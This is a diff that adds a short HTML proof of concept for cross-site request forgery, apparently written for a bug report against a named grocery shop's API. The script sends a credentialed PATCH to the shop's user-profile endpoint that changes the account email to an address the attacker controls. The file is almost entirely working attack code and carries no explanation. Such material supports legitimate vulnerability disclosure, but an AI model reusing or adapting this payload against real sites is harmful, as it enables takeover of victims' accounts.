@@ -1,0 +1,22 @@
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("PATCH", "https:\/\/shop.sprouts.com\/api\/v2\/user\/profile", true);
+        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
+        xhr.setRequestHeader("Content-Type", "application\/json");
+        xhr.withCredentials = true;
+        var body = "{\"email\":\"testidjenish@gmail.com\",\"items\":[]}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
